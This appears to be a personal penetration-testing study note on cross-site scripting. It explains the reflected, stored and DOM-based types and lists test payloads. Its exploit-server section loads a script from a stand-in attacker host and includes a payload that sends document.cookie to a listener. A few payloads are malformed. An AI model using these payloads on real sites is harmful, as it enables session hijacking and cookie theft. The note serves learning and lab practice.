---
tags:
  - XSS
  - Web
refs:
  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#methodology
description: Inject malicious (Javascript) scripts into input fields
---
---
## Basics
- Execute JavaScript in victims browser
- Containers extension is useful
**Types:**
1. Reflected - Script injected comes from current HTTP request, script included in response
2. Stored - payload stored in database and retrieved later
3. DOM - Client side uses untrusted input
**Need to figure out:**
4. Where the payload appears in response
5. What input validation exists
---
## Test for XSS
```
<script>alert(1)</script>
<script>debugger;</script>

<script>print()</script>
<script>"prompt"(hello)</script>

<img src=x onerror(alert(1))>
```
**All the different tags and events:** https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- Can fuzz through all the tags to see if any get through in case of filter
## Communicate with exploit server
1. Listener [[HTTP Exfiltration Server]]
- exploit server
```
<script src="https://exploitserver.htb/exploit"></script>
```
- payload
```
window.location = "https://<http-listner-server>:4443/cookiestealer?c=" + document.cookie;
```
---
## Stored XSS
**User input is stored on the back-end database (or file) and then displayed upon retrieval (posts or comments)**
Example Payload:
```
<script>alert(window.origin)</script>
<script>alert(document.cookie)</script>

<script>print()</script>
<script>alert(window.origin)</script>
<img src=x onerror(alert(1))>
```
1. CTRL+U View page source and should see payload
---
## Reflected XSS
**Script is reflected after being processed and retrieved in the server response (e.g., via URL parameter), but not stored. Only executes when the crafted URL is visited. (Non persistence)**
```html
<div></div><ul class="list-unstyled" id="todo"><div style="padding-left:25px">Task '<script>alert(window.origin)</script>' could not be added.</div></ul>
```
1. Send to victim via an URL
---
## DOM-based XSS
**Where Java can modify the client-side DOM based on unsantized user input**
1. Occurs when JavaScript is used to change page source through Document Object Model
2. CNTRL+SHIFT+C
3. **DOM Source** - Javascript object that takes user input, and it can be any input parameter like a URL parameter or input field as we saw above
4. **DOM Sink** -  Function that writes user input to a DOM Object on the page. If sink function doesn't properly sanitize user input, it would be vulnerable to XSS
5. Common JS function to write to DOM sink
	- Document.write()
	- DOM.innerHTML
	- DOM.outerHTML
6. JQuery functions to write to DOM
	- add()
	- after()
	- append()
**Example**
7. Identify where the Source is taken from (e.g. script.js task= parameter)
```javascript
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
```
- below page uses innerHTML function to write to task variable in todo DOM
```javascript
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```
- InnerDOM Doesn't allow the use of script tags therefore payloads without script tags work
```html
<img src="" onerror=alert(window.origin)>
```
- Similar to reflected you would have to target the user with the URL
---
## Defence
1. **HTTPonly** flag on cookies ensure that only HTTP can access the cookie and not scripts such as Javascript used within XSS
